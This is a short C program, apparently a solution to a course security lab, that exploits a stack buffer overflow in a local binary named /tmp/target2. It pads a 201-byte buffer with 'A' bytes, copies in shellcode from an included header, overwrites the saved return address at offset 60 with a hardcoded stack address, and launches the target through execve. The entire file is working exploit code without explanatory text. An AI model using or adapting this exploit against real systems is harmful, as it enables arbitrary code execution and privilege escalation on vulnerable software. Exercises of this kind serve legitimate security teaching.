#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char exploit[201];
  // set all As
  memset(exploit, 0x41, sizeof(exploit));

  // insert null terminator
  memset(exploit + (sizeof(exploit)-1), 0x00, 1);

  // insert shellcode
  memcpy(exploit, shellcode, sizeof(shellcode) - 1);

  int *return_address = (int *)(exploit + 60);
  *return_address = 0xbffffcc8;

  char *args[] = { TARGET, exploit, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
